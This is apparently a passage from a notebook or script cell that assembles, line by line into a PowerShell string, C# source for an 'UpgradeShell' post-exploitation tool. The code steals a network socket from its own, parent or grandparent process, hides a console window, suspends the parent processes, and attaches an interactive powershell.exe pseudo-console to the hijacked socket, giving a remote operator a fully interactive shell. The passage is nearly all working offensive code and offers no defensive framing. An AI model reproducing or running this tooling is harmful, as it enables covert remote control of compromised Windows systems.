	"$source2 += \"        IntPtr[] wsaEventsArray = new IntPtr[] { wsaReadEvent };`n\"\n",
	"$source2 += \"        do`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            byte[] bytesReceived = new byte[bufferSize];`n\"\n",
	"$source2 += \"            WSAWaitForMultipleEvents(wsaEventsArray.Length, wsaEventsArray, true, 500, false);`n\"\n",
	"$source2 += \"            nBytesReceived = recv(shellSocket, bytesReceived, bufferSize, 0);`n\"\n",
	"$source2 += \"            // we still check WSAEWOULDBLOCK for a more robust implementation`n\"\n",
	"$source2 += \"            if (WSAGetLastError() == WSAEWOULDBLOCK)`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                socketBlockingOperation = true;`n\"\n",
	"$source2 += \"                continue;`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"            WSAResetEvent(wsaReadEvent);`n\"\n",
	"$source2 += \"            socketBlockingOperation = false;`n\"\n",
	"$source2 += \"            // Console.WriteLine(`\"debug: ThreadReadSocketWritePipe recv: nBytesReceived = `\" + nBytesReceived + `\" WSAGetLastError() = `\" + WSAGetLastError().ToString());`n\"\n",
	"$source2 += \"            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);`n\"\n",
	"$source2 += \"            // Console.WriteLine(`\"debug ThreadReadSocketWritePipe WriteFile: bytesWritten = `\" + bytesWritten + `\" Marshal.GetLastWin32Error() = `\" + Marshal.GetLastWin32Error());`n\"\n",
	"$source2 += \"        } while (socketBlockingOperation || (nBytesReceived > 0 && writeSuccess));`n\"\n",
	"$source2 += \"        WSACloseEvent(wsaReadEvent);`n\"\n",
	"$source2 += \"        TerminateProcess(hChildProcess, 0);`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr shellSocket, IntPtr hChildProcess, bool overlappedSocket)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        object[] threadParameters = new object[3];`n\"\n",
	"$source2 += \"        threadParameters[0] = InputPipeWrite;`n\"\n",
	"$source2 += \"        threadParameters[1] = shellSocket;`n\"\n",
	"$source2 += \"        threadParameters[2] = hChildProcess;`n\"\n",
	"$source2 += \"        Thread thReadSocketWritePipe;`n\"\n",
	"$source2 += \"        if(overlappedSocket)`n\"\n",
	"$source2 += \"            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeOverlapped);`n\"\n",
	"$source2 += \"        else`n\"\n",
	"$source2 += \"            thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipeNonOverlapped);`n\"\n",
	"$source2 += \"        thReadSocketWritePipe.Start(threadParameters);`n\"\n",
	"$source2 += \"        return thReadSocketWritePipe;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    public static string SpawnUpgradeShell(uint rows, uint cols)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        string commandLine = `\"powershell.exe`\";`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        IntPtr shellSocket = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr InputPipeRead = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr InputPipeWrite = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr OutputPipeRead = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr OutputPipeWrite = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr handlePseudoConsole = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr oldStdIn = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr oldStdOut = IntPtr.Zero;`n\"\n",
	"$source2 += \"        IntPtr oldStdErr = IntPtr.Zero;`n\"\n",
	"$source2 += \"        bool newConsoleAllocated = false;`n\"\n",
	"$source2 += \"        bool parentSocketInherited = false;`n\"\n",
	"$source2 += \"        bool grandParentSocketInherited = false;`n\"\n",
	"$source2 += \"        bool conptyCompatible = false;`n\"\n",
	"$source2 += \"        bool IsSocketOverlapped = true;`n\"\n",
	"$source2 += \"        string output = `\"`\";`n\"\n",
	"$source2 += \"        Process currentProcess = null;`n\"\n",
	"$source2 += \"        Process parentProcess = null;`n\"\n",
	"$source2 += \"        Process grandParentProcess = null;`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        if (GetProcAddress(GetModuleHandle(`\"kernel32`\"), `\"CreatePseudoConsole`\") != IntPtr.Zero)`n\"\n",
	"$source2 += \"            conptyCompatible = true;`n\"\n",
	"$source2 += \"        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        // comment the below function to debug errors`n\"\n",
	"$source2 += \"        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr);`n\"\n",
	"$source2 += \"        // init wsastartup stuff for this thread`n\"\n",
	"$source2 += \"        InitWSAThread();`n\"\n",
	"$source2 += \"        if (conptyCompatible)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            Console.WriteLine(`\"\r\nCreatePseudoConsole function found! Spawning a fully interactive shell\r\n`\");`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"            List<IntPtr> socketsHandles = new List<IntPtr>();`n\"\n",
	"$source2 += \"            currentProcess = Process.GetCurrentProcess();`n\"\n",
	"$source2 += \"            parentProcess = ParentProcessUtilities.GetParentProcess(currentProcess.Handle);`n\"\n",
	"$source2 += \"            if (parentProcess != null) grandParentProcess = ParentProcessUtilities.GetParentProcess(parentProcess.Handle);`n\"\n",
	"$source2 += \"            // try to duplicate the socket for the current process`n\"\n",
	"$source2 += \"            shellSocket = SocketHijacking.DuplicateTargetProcessSocket(currentProcess, ref IsSocketOverlapped);`n\"\n",
	"$source2 += \"            if (shellSocket == IntPtr.Zero && parentProcess != null)`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                // if no sockets are found in the current process we try to hijack our current parent process socket`n\"\n",
	"$source2 += \"                shellSocket = SocketHijacking.DuplicateTargetProcessSocket(parentProcess, ref IsSocketOverlapped);`n\"\n",
	"$source2 += \"                if (shellSocket == IntPtr.Zero && grandParentProcess != null)`n\"\n",
	"$source2 += \"                {`n\"\n",
	"$source2 += \"                    // damn, even the parent process has no usable sockets, let`'s try a last desperate attempt in the grandparent process`n\"\n",
	"$source2 += \"                    shellSocket = SocketHijacking.DuplicateTargetProcessSocket(grandParentProcess, ref IsSocketOverlapped);`n\"\n",
	"$source2 += \"                    if (shellSocket == IntPtr.Zero)`n\"\n",
	"$source2 += \"                    {`n\"\n",
	"$source2 += \"                        throw new UpgradeShellException(`\"No \\Device\\Afd objects found. Socket duplication failed.`\");`n\"\n",
	"$source2 += \"                    }`n\"\n",
	"$source2 += \"                    else`n\"\n",
	"$source2 += \"                    {`n\"\n",
	"$source2 += \"                        grandParentSocketInherited = true;`n\"\n",
	"$source2 += \"                    }`n\"\n",
	"$source2 += \"                }`n\"\n",
	"$source2 += \"                else`n\"\n",
	"$source2 += \"                {`n\"\n",
	"$source2 += \"                    // gotcha a usable socket from the parent process, let`'s see if the grandParent also use the socket`n\"\n",
	"$source2 += \"                    parentSocketInherited = true;`n\"\n",
	"$source2 += \"                    if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);`n\"\n",
	"$source2 += \"                }`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"            else`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                // the current process got a usable socket, let`'s see if the parents use the socket`n\"\n",
	"$source2 += \"                if (parentProcess != null) parentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, parentProcess);`n\"\n",
	"$source2 += \"                if (grandParentProcess != null) grandParentSocketInherited = SocketHijacking.IsSocketInherited(shellSocket, grandParentProcess);`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"            if (GetConsoleWindow() == IntPtr.Zero)`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                AllocConsole();`n\"\n",
	"$source2 += \"                ShowWindow(GetConsoleWindow(), SW_HIDE);`n\"\n",
	"$source2 += \"                newConsoleAllocated = true;`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"            // debug code for checking handle duplication`n\"\n",
	"$source2 += \"            // Console.WriteLine(`\"debug: Creating pseudo console...`\");`n\"\n",
	"$source2 += \"            // Thread.Sleep(180000);`n\"\n",
	"$source2 += \"            // return `\"`\";`n\"\n",
	"$source2 += \"            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);`n\"\n",
	"$source2 += \"            if (pseudoConsoleCreationResult != 0)`n\"\n",
	"$source2 += \"            {`n\"\n",
	"$source2 += \"                output += string.Format(`\"{0}Could not create psuedo console. Error Code {1}`\", errorString, pseudoConsoleCreationResult.ToString());`n\"\n",
	"$source2 += \"                return output;`n\"\n",
	"$source2 += \"            }`n\"\n",
	"$source2 += \"            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        else`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            output += string.Format(`\"Could not upgrade shell to fully interactive because ConPTY is not compatible on this system`\");`n\"\n",
	"$source2 += \"            return output;`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        // Note: We can close the handles to the PTY-end of the pipes here`n\"\n",
	"$source2 += \"        // because the handles are dup`'ed into the ConHost and will be released`n\"\n",
	"$source2 += \"        // when the ConPTY is destroyed.`n\"\n",
	"$source2 += \"        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);`n\"\n",
	"$source2 += \"        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        // we need to suspend other processes that can interact with the duplicated sockets if any. This will ensure stdin, stdout and stderr is read/write only by our conpty process`n\"\n",
	"$source2 += \"        if (parentSocketInherited) NtSuspendProcess(parentProcess.Handle);`n\"\n",
	"$source2 += \"        if (grandParentSocketInherited) NtSuspendProcess(grandParentProcess.Handle);`n\"\n",
	"$source2 += \"        if (!IsSocketOverlapped) SocketHijacking.SetSocketBlockingMode(shellSocket, 1);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        //Threads have better performance than Tasks`n\"\n",
	"$source2 += \"        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, shellSocket, IsSocketOverlapped);`n\"\n",
	"$source2 += \"        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, shellSocket, childProcessInfo.hProcess, IsSocketOverlapped);`n\"\n",
	"$source2 += \"        // wait for the child process until exit`n\"\n",
	"$source2 += \"        WaitForSingleObject(childProcessInfo.hProcess, INFINITE);`n\"\n",
	"$source2 += \"        //cleanup everything`n\"\n",
	"$source2 += \"        thThreadReadPipeWriteSocket.Abort();`n\"\n",
	"$source2 += \"        thReadSocketWritePipe.Abort();`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        if (!IsSocketOverlapped)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            // cancelling the event selection for the socket`n\"\n",
	"$source2 += \"            WSAEventSelect(shellSocket, IntPtr.Zero, 0);`n\"\n",
	"$source2 += \"            SocketHijacking.SetSocketBlockingMode(shellSocket, 0);`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        if (parentSocketInherited) NtResumeProcess(parentProcess.Handle);`n\"\n",
	"$source2 += \"        if (grandParentSocketInherited) NtResumeProcess(grandParentProcess.Handle);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        closesocket(shellSocket);`n\"\n",
	"$source2 += \"        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);`n\"\n",
	"$source2 += \"        if (newConsoleAllocated)`n\"\n",
	"$source2 += \"            FreeConsole();`n\"\n",
	"$source2 += \"        CloseHandle(childProcessInfo.hThread);`n\"\n",
	"$source2 += \"        CloseHandle(childProcessInfo.hProcess);`n\"\n",
	"$source2 += \"        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);`n\"\n",
	"$source2 += \"        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);`n\"\n",
	"$source2 += \"        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);`n\"\n",
	"$source2 += \"        output += `\"UpgradeShell kindly exited.\r\n`\";`n\"\n",
	"$source2 += \"        return output;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"}`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"public static class UpgradeMainClass`n\"\n",
	"$source2 += \"{`n\"\n",
	"$source2 += \"    private static int CheckInt(string arg)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        int ret = 0;`n\"\n",
	"$source2 += \"        if (!Int32.TryParse(arg, out ret))`n\"\n",
	"$source2 += \"            throw new UpgradeShellException(`\"\r\nUpgradeShell: Invalid integer value `\" + arg);`n\"\n",
	"$source2 += \"        return ret;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static uint ParseRows(string[] arguments)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        uint rows = 24;`n\"\n",
	"$source2 += \"        if (arguments.Length > 0)`n\"\n",
	"$source2 += \"            rows = (uint)CheckInt(arguments[0]);`n\"\n",
	"$source2 += \"        return rows;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    private static uint ParseCols(string[] arguments)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        uint cols = 80;`n\"\n",
	"$source2 += \"        if (arguments.Length > 1)`n\"\n",
	"$source2 += \"            cols = (uint)CheckInt(arguments[1]);`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        return cols;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"    public static string UpgradeMain(string[] args)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        string output = `\"`\";`n\"\n",
	"$source2 += \"        try`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            uint rows = ParseRows(args);`n\"\n",
	"$source2 += \"            uint cols = ParseCols(args);`n\"\n",
	"$source2 += \"            output = UpgradeShell.SpawnUpgradeShell(rows, cols);`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"        catch (Exception e)`n\"\n",
	"$source2 += \"        {`n\"\n",
	"$source2 += \"            Console.WriteLine(`\"\n`\" + e.ToString() + `\"\n`\");`n\"\n",
	"$source2 += \"        }`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"        return output;`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"}`n\"\n",
	"$source2 += \"`n\"\n",
	"$source2 += \"class MainClass`n\"\n",
	"$source2 += \"{`n\"\n",
	"$source2 += \"    static void Main(string[] args)`n\"\n",
	"$source2 += \"    {`n\"\n",
	"$source2 += \"        Console.Out.Write(UpgradeMainClass.UpgradeMain(args));`n\"\n",
	"$source2 += \"    }`n\"\n",
	"$source2 += \"}`n\"\n"
);